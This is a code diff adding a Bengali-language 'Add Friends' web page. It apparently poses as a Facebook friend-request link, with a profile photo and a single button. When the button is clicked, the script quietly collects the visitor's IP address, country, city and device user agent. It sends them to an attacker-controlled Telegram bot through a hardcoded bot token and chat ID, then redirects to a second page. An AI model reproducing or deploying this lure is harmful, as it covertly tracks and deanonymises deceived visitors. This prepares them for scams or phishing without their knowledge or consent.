@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Friends</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex flex-col items-center min-h-screen">
+
+    <div class="w-full h-[50vh] overflow-hidden">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
+             alt="Profile Image" 
+             class="w-full h-full object-cover">
+    </div>
+
+    <div class="p-8 w-full max-w-sm">
+        <button onclick="trackAndRedirect()" id="mainBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition duration-300 shadow-lg active:scale-95">
+            Add Friends
+        </button>
+    </div>
+
+    <script>
+        async function trackAndRedirect() {
+            const btn = document.getElementById('mainBtn');
+            btn.innerText = "Connecting...";
+            btn.disabled = true;
+            
+            try {
+                // আইপি ডাটা সংগ্রহ
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // ডিভাইসের তথ্য
+                const deviceInfo = navigator.userAgent;
+                const message = `👤 ইউজার: Mst.Sarmin Akter_11223\n\n🚨 নতুন ক্লিক এলার্ট!\n\n📱 ডিভাইস: ${deviceInfo}\n🌍 দেশ: ${ipData.country_name}\n🏙️ শহর: ${ipData.city}\n🌐 IP: ${ipData.ip}\n⏰ সময়: ${new Date().toLocaleString()}`;
+
+                // টেলিগ্রামে তথ্য পাঠানো
+                const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+                const chatId = "8516934257";
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } catch (e) {
+                console.error("Error:", e);
+            }
+
+            // পেজ রিডাইরেক্ট
+            window.location.href = "page2.html"; 
+        }
+    </script>
+</body>
+</html>
